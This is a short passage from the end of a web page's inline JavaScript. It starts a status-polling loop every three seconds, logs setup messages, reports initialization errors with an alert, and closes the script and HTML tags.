fetchStatus();
setInterval(fetchStatus,3000);

console.log('Setup complete!');
}
catch(err){
console.error('DOMContentLoaded error:',err);
alert('Initialization error: '+err.message);
}
});

console.log('Script loaded, waiting for DOM...');

</script>
</body>
</html>